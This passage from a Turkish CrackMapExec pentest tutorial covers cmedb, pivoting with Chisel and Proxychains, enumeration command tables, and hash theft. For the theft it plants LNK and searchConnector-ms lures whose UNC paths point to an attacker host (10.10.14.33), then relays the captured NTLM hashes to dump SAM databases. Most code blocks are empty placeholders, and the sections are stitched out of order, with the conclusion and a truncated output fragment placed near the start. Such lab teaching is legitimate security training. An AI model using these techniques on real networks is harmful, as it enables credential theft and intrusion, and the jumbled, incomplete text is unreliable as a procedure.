### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus

```

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

